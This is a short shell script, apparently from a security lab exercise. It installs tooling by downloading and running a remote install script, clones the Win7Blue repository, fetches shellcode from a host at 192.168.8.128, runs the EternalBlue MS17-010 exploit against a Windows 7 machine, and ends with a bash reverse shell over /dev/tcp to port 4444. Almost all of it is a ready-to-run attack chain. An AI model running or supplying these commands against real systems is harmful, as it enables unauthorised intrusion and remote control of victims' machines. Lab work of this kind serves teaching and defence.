# Install dependencies for Win7Blue
rm /home/ubuntu/deps -rf
pip install markupsafe
curl -O https://raw.githubusercontent.com/uit-anhvuk13/uit.nt230.labs/master/lab3/install.sh
sed -i "s/kali/ubuntu/g" install.sh
chmod +x install.sh
./install.sh

# Download Win7Blue
git clone https://github.com/d4t4s3c/Win7Blue
cd Win7Blue

# Download served payload
curl -O http://192.168.8.128/sc.bin

# Exploit MS17-010 Windows 7 (port 4445)
python eternalblue_exploit7.py 192.168.8.129 sc.bin

# Exploit the worker machine Ubuntu (port 4444)
exec bash -c "bash -i >& /dev/tcp/192.168.8.128/4444 0>&1"
